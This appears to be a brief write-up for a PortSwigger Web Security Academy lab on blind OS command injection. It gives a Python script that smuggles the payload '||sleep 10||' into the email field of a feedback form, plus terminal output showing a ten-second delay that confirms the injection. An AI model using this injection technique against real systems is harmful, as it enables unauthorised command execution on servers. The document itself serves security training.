
<img width="771" height="624" alt="image" src="https://github.com/user-attachments/assets/ce7a6707-7214-464d-9dc7-439ffe05421d" />

<img width="1040" height="518" alt="image" src="https://github.com/user-attachments/assets/c3c3a6ed-e70f-4a03-8a6b-7aae6f9add15" />

<img width="1199" height="528" alt="image" src="https://github.com/user-attachments/assets/69419a1f-f63d-43e3-ac0d-dfcbdeeb4ff0" />

``` python

import requests, time

url = "https://0a2800260413079a82da6bea008900bb.web-security-academy.net/"

session = requests.Session()
session.cookies.set("session", "02cFZy3q1L6GhmypbGB0ZWVv7aSSaiCK")

try:
   command = "||sleep 10||"
   inicio = time.time()
   r = session.post(url + "/feedback/submit" , data={"csrf": "pYwZDMQHUOud8LxBwOuvN2fmF6hx4Sqn", "name": "test" , "email": f"x{command}", "subject": "test" , "message": "test"})
   print(r.status_code)
   print(r.text)
   fin = time.time()
   print(f"Tiempo tardado: {fin - inicio:.2f} segundos")
except Exception as e:
      print(f"Error: {e}")

```

``` bash

❯ python3 exploit.py
200
{}
Tiempo tardado: 10.26 segundos
╭─ ~/portswigger/os-command-injection/level2                                                                 ✔ │ 10s ─╮
╰─                                                                                                                   ─╯

```
